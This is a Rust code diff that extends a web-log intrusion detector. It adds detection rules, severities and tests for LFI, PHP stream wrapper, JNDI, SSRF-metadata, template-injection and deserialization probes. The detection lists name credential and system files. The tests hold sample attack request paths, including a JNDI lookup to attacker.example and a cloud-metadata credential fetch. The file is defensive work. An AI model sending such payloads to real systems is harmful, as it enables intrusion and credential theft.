@@ -77,6 +77,12 @@ enum ProbeFamily {
     CgiShellTraversal,
     CommandInjection,
     PhpConfigInjection,
+    LfiFileRead,
+    PhpStreamWrapper,
+    JavaJndiInjection,
+    SsrfMetadata,
+    TemplateInjection,
+    DeserializationProbe,
     SqlInjection,
     PathTraversal,
     PhpMyAdmin,
@@ -96,6 +102,12 @@ impl ProbeFamily {
             Self::CgiShellTraversal => "cgi_shell_traversal",
             Self::CommandInjection => "command_injection",
             Self::PhpConfigInjection => "php_config_injection",
+            Self::LfiFileRead => "lfi_file_read",
+            Self::PhpStreamWrapper => "php_stream_wrapper",
+            Self::JavaJndiInjection => "java_jndi_injection",
+            Self::SsrfMetadata => "ssrf_metadata",
+            Self::TemplateInjection => "template_injection",
+            Self::DeserializationProbe => "deserialization_probe",
             Self::SqlInjection => "sql_injection",
             Self::PathTraversal => "path_traversal",
             Self::PhpMyAdmin => "phpmyadmin",
@@ -112,6 +124,12 @@ impl ProbeFamily {
             Self::CgiShellTraversal
             | Self::CommandInjection
             | Self::PhpConfigInjection
+            | Self::LfiFileRead
+            | Self::PhpStreamWrapper
+            | Self::JavaJndiInjection
+            | Self::SsrfMetadata
+            | Self::TemplateInjection
+            | Self::DeserializationProbe
             | Self::SqlInjection => Severity::Medium,
             _ => Severity::Low,
         }
@@ -125,6 +143,12 @@ impl ProbeFamily {
             | Self::CgiShellTraversal
             | Self::CommandInjection
             | Self::PhpConfigInjection
+            | Self::LfiFileRead
+            | Self::PhpStreamWrapper
+            | Self::JavaJndiInjection
+            | Self::SsrfMetadata
+            | Self::TemplateInjection
+            | Self::DeserializationProbe
             | Self::SqlInjection
             | Self::PathTraversal => Severity::High,
             _ => Severity::Medium,
@@ -139,6 +163,12 @@ impl ProbeFamily {
             | Self::CgiShellTraversal
             | Self::CommandInjection
             | Self::PhpConfigInjection
+            | Self::LfiFileRead
+            | Self::PhpStreamWrapper
+            | Self::JavaJndiInjection
+            | Self::SsrfMetadata
+            | Self::TemplateInjection
+            | Self::DeserializationProbe
             | Self::SqlInjection
             | Self::PathTraversal => Severity::Medium,
             _ => Severity::Low,
@@ -318,6 +348,36 @@ fn classify_probe_path(path: &str) -> Option<ProbeSignature> {
             family: ProbeFamily::PhpConfigInjection,
         });
     }
+    if normalized.contains_lfi_file_read_payload() {
+        return Some(ProbeSignature {
+            family: ProbeFamily::LfiFileRead,
+        });
+    }
+    if normalized.contains_php_stream_wrapper_payload() {
+        return Some(ProbeSignature {
+            family: ProbeFamily::PhpStreamWrapper,
+        });
+    }
+    if normalized.contains_java_jndi_payload() {
+        return Some(ProbeSignature {
+            family: ProbeFamily::JavaJndiInjection,
+        });
+    }
+    if normalized.contains_ssrf_metadata_payload() {
+        return Some(ProbeSignature {
+            family: ProbeFamily::SsrfMetadata,
+        });
+    }
+    if normalized.contains_template_injection_payload() {
+        return Some(ProbeSignature {
+            family: ProbeFamily::TemplateInjection,
+        });
+    }
+    if normalized.contains_deserialization_payload() {
+        return Some(ProbeSignature {
+            family: ProbeFamily::DeserializationProbe,
+        });
+    }
     if normalized.contains_sql_payload() {
         return Some(ProbeSignature {
             family: ProbeFamily::SqlInjection,
@@ -382,6 +442,66 @@ impl NormalizedPath {
         pearcmd_config_create || traversal_php_write
     }
 
+    fn contains_lfi_file_read_payload(&self) -> bool {
+        has_path_traversal(&self.spaced)
+            && [
+                "/etc/passwd",
+                "/etc/shadow",
+                "/proc/self/environ",
+                "/proc/self/cmdline",
+                "/windows/win.ini",
+            ]
+            .iter()
+            .any(|marker| self.spaced.contains(marker))
+    }
+
+    fn contains_php_stream_wrapper_payload(&self) -> bool {
+        [
+            "php://filter",
+            "php://input",
+            "data://text",
+            "expect://",
+            "phar://",
+            "zip://",
+        ]
+        .iter()
+        .any(|marker| self.spaced.contains(marker))
+    }
+
+    fn contains_java_jndi_payload(&self) -> bool {
+        self.spaced.contains("${jndi:")
+            || self.spaced.contains("$%7bjndi:")
+            || self.spaced.contains("%24%7bjndi:")
+    }
+
+    fn contains_ssrf_metadata_payload(&self) -> bool {
+        self.spaced.contains("metadata.google.internal")
+            || self.spaced.contains("metadata/computemetadata/v1")
+            || (self.spaced.contains("169.254.169.254")
+                && (self.spaced.contains("metadata") || self.spaced.contains("latest")))
+            || (self.spaced.contains("100.100.100.200")
+                && (self.spaced.contains("metadata") || self.spaced.contains("latest")))
+    }
+
+    fn contains_template_injection_payload(&self) -> bool {
+        let value = &self.spaced;
+        (value.contains("{{") && value.contains("}}") && has_template_expression_marker(value))
+            || value.contains("<%=7*7%>")
+            || value.contains("${7*7}")
+    }
+
+    fn contains_deserialization_payload(&self) -> bool {
+        [
+            "ysoserial",
+            "commonscollections",
+            "java.util.priorityqueue",
+            "ro0ab",
+            "aced0005",
+        ]
+        .iter()
+        .any(|marker| self.spaced.contains(marker))
+    }
+
     fn contains_sql_payload(&self) -> bool {
         self.spaced.contains(" or 1=1") || self.spaced.contains("union select")
     }
@@ -406,6 +526,19 @@ fn has_php_code_marker(value: &str) -> bool {
         ]
         .iter()
         .any(|token| value.contains(token))
+}
+
+fn has_template_expression_marker(value: &str) -> bool {
+    [
+        "7*7",
+        "config.",
+        "self.__",
+        "__class__",
+        "__mro__",
+        "request.application",
+    ]
+    .iter()
+    .any(|marker| value.contains(marker))
 }
 
 fn has_shell_expansion(value: &str) -> bool {
@@ -593,6 +726,41 @@ mod tests {
             .evidence
             .iter()
             .any(|item| { item.key == "probe_family" && item.value == "php_config_injection" }));
+    }
+
+    #[test]
+    fn high_confidence_web_exploit_families_are_classified() {
+        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
+        let cases = [
+            ("/download?file=../../../../etc/passwd", "lfi_file_read"),
+            (
+                "/index.php?page=php://filter/convert.base64-encode/resource=config.php",
+                "php_stream_wrapper",
+            ),
+            (
+                "/?q=${jndi:ldap://attacker.example/a}",
+                "java_jndi_injection",
+            ),
+            (
+                "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "ssrf_metadata",
+            ),
+            ("/search?q={{7*7}}", "template_injection"),
+            ("/api?payload=ysoserial", "deserialization_probe"),
+        ];
+
+        for (path, family) in cases {
+            let findings =
+                WebDetector.detect(&[access_event("203.0.113.60", "GET", path, "404")], &ctx);
+
+            assert_eq!(findings.len(), 1, "path should be classified: {path}");
+            assert_eq!(findings[0].rule_id, "WEB-001");
+            assert_eq!(findings[0].severity, Severity::Medium);
+            assert!(findings[0]
+                .evidence
+                .iter()
+                .any(|item| { item.key == "probe_family" && item.value == family }));
+        }
     }
 
     #[test]
